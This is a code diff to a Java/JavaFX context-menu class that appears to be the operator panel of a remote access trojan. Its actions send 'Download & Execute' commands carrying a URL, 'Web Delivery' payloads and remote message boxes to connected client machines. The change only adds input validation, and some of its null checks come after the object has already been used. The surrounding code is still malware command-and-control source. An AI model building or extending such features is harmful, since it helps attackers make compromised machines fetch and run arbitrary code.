@@ -85,7 +85,6 @@ class IPContextMenu implements Repository {
 
         MenuItem si5 = new MenuItem("Download & Execute");
         si5.setOnAction(event -> {
-
             Stage stage = new Stage();
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinWidth(300);
@@ -97,8 +96,10 @@ class IPContextMenu implements Repository {
                     try {
                         // TODO put in url regex check
                         String url = DownloadAndExecuteView.getUrlFieldValue();
-                        Logger.log(Level.INFO, "Sending DaE for: " + url);
-                        clientObject.clientCommunicate("DAE " + url);
+                        if (!(url.equals("") || DownloadAndExecuteView.getUrlField() == null)) {
+                            Logger.log(Level.INFO, "Sending DaE for: " + url);
+                            clientObject.clientCommunicate("DAE " + url);
+                        }
                         //clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                     } catch (IOException e1) {
                         e1.printStackTrace();
@@ -157,10 +158,11 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinWidth(300);
             stage.setMinHeight(300);
-            stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 300));
+            stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 350));
             stage.show();
             WebDeliveryView.getTargetsComboBox().getSelectionModel().selectFirst();
             WebDeliveryView.getExecuteButton().setOnAction(a -> {
+                if (WebDeliveryView.getUrl().getText().equals("") || WebDeliveryView.getUrl() == null){ }else{
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
@@ -169,7 +171,7 @@ class IPContextMenu implements Repository {
                     } catch (IOException e1) {
                         e1.printStackTrace();
                     }
-                }
+                }}
             });
         });
 
@@ -337,6 +339,7 @@ class IPContextMenu implements Repository {
             stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage), 400, 300));
             stage.show();
             ShowMessageboxView.getGoButton().setOnAction(a -> {
+                if(ShowMessageboxView.getMsg().getText().equals("") || ShowMessageboxView.getMsg() == null || ShowMessageboxView.getTitle().getText().equals("") || ShowMessageboxView.getTitle() == null){}else{
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
                         clientObject.clientCommunicate("MSGBOX " + ShowMessageboxView.getMsg().getText().trim() + "::::::::::" + ShowMessageboxView.getTitle().getText().trim());
@@ -344,7 +347,7 @@ class IPContextMenu implements Repository {
                     } catch (IOException e1) {
 
                     }
-                }
+                }}
             });
         });
 
